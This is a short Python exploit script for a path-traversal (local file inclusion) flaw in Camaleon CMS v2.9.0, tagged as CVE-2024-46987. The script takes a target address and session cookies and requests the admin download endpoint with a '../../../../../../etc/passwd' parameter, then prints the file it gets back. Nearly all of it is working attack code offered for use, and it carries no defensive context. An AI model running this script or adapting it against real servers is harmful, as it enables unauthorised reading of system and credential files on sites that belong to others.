import requests
import argparse

parser = argparse.ArgumentParser(
    prog='Camaleon CMS',
    description='LFI in Camaleon CMS v2.9.0 (tracked as CVE-2024-46987)',
    epilog='Thank you for using this!'
)
parser.add_argument('-a', '--auth-token', help="auth_token = token...", required=True)
parser.add_argument('-s', '--session', help="_factsapp_session= token...", required=True)
parser.add_argument('-t', '--target', help="target= IP", required=True)
args = parser.parse_args()

url = f"http://{args.target}/admin/media/download_private_file"  # change https or http According to your Requiremnts
cookies = {
    "auth_token": args.auth_token,
    "_factsapp_session": args.session
}

params = {
    "file": "../../../../../../etc/passwd"
}
response = requests.get(url, params=params, cookies=cookies)
print("[+] Printing  /etc/passwd")
print("")
print(response.text)
